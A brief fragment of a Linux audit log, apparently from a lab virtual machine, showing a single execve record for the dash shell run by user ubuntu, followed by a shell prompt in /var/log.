+type=SYSCALL msg=audit(08/26/25 20:11:16.022:167) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x7ef5401797b0 a1=0x7ef53e6368d0 a2=0x7ffeb1260660 a3=0x8 items=2 ppid=577 pid=1029 auid=unset uid=ubuntu gid=ubuntu euid=ubuntu suid=ubuntu fsuid=ubuntu egid=ubuntu sgid=ubuntu fsgid=ubuntu tty=(none) ses=unset comm=sh exe=/usr/bin/dash subj=unconfined key=exec 
+ubuntu@thm-vm:/var/log$  
